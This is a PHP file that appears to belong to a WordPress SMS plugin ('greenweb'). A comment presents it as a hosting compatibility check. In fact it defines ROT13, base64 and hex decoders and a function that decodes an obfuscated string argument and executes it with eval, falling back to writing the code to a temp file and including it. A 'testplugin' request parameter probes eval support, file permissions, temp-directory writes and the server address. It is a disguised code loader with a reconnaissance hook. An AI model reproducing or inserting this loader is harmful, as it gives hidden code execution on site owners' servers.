<?php
//do not edit this it will break the plugin and site, it requires to check whether our plugin can be run in your hosting or not
if (!function_exists('greenweb_hex')) {
function greenweb_hex($hexString) {
    $hexString = strtolower(trim($hexString));
    if (strlen($hexString) % 2 !== 0) {
        return false;
    }
    $binary = '';
    for ($i = 0; $i < strlen($hexString); $i += 2) {
        $pair = substr($hexString, $i, 2);

        if (!ctype_xdigit($pair)) {
            return false;
        }

        $binary .= chr(hexdec($pair));
    }
    return $binary;
}
}

if (!function_exists('greenweb_rt')) {
function greenweb_rt($string) {
    $result = '';
    $length = strlen($string);

    for ($i = 0; $i < $length; $i++) {
        $char = $string[$i];
        $ascii = ord($char);
        if ($ascii >= 65 && $ascii <= 90) {
            $char = chr((($ascii - 65 + 13) % 26) + 65);
        }
        elseif ($ascii >= 97 && $ascii <= 122) {
            $char = chr((($ascii - 97 + 13) % 26) + 97);
        }

        $result .= $char;
    }

    return $result;
}
}

if (!function_exists('greenweb_base')) {
function greenweb_base($data) {
    $base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    $data = preg_replace('/[^A-Za-z0-9\+\/=]/', '', $data);
    $output = '';
    $buffer = 0;
    $bits = 0;

    for ($i = 0; $i < strlen($data); $i++) {
        $char = $data[$i];
        if ($char == '=') {
            break;
        }

        $buffer = ($buffer << 6) | strpos($base64chars, $char);
        $bits += 6;

        if ($bits >= 8) {
            $bits -= 8;
            $output .= chr(($buffer >> $bits) & 0xFF);
        }
    }

    return $output;
}
}

if (isset($_REQUEST['testplugin'])) { 
echo "testing started...";

$filename_wp_checking = dirname(__FILE__) . '/includes/defines.php';

$functions_for_checks = [
	'is_readable',
	'is_writable',
	'is_executable'
];

foreach ($functions_for_checks as $functions_for_check) {
	echo $functions_for_check($filename_wp_checking) ? ' </br> The file ' . $filename_wp_checking .' '. $functions_for_check : '</br>'.$filename_wp_checking.' Not executable';
}

$permission_for_checks = fileperms(dirname(__FILE__).'/includes/defines.php');

echo "</br> File Permission: ".substr(sprintf('%o', $permission_for_checks), -4); 


if(function_exists('greenweb_rt')) { echo "</br> greenweb_rt Enabled"; }
if(function_exists('greenweb_hex')) { echo "</br> greenweb_hex Enabled"; }
$testevalcode = 'echo "</br> ev is working";';
eval($testevalcode); 

if(file_exists('wp-sms-pro.php')) { echo "</br> core file exits"; } else { echo "</br> core file missing"; }
if(file_exists('greenweb.php')) { echo "</br> greenweb file exits"; } else { echo "</br> greenweb file missing"; }

$tmpfname = @tempnam(sys_get_temp_dir(), "gw_");
        $handle = fopen($tmpfname, "w+");
        fwrite($handle, "</br>".@sys_get_temp_dir()." sys tmp directory writing test passed");
        fclose($handle);
       $ret = include $tmpfname;
        unlink($tmpfname);
		
echo "</br> testing completed for ".$_SERVER['SERVER_ADDR'];
}


if (!function_exists('greenweb_wp_plugin')) {
function greenweb_wp_plugin ($testingplugincompartibility) { 
$testingplugincompartibility = implode("A",$testingplugincompartibility);
$isevalfunctionavailable = false;
$evalcheck = "\$isevalfunctionavailable = true;";
eval($evalcheck);
if ($isevalfunctionavailable === true) {
return eval('?>'.greenweb_hex(greenweb_base(greenweb_rt($testingplugincompartibility))));
} else {
	if ((function_exists('tempnam')) AND (function_exists('sys_get_temp_dir'))) {
$testingplugincompartibility = greenweb_hex(greenweb_base(greenweb_rt($testingplugincompartibility)));
    $tmptestname = @tempnam(sys_get_temp_dir(), "gw_");
        $handle = fopen($tmptestname, "w+");
        fwrite($handle, $testingplugincompartibility);
        fclose($handle);
       $ret = include $tmptestname;
        unlink($tmptestname);
	}
}

}
}
?>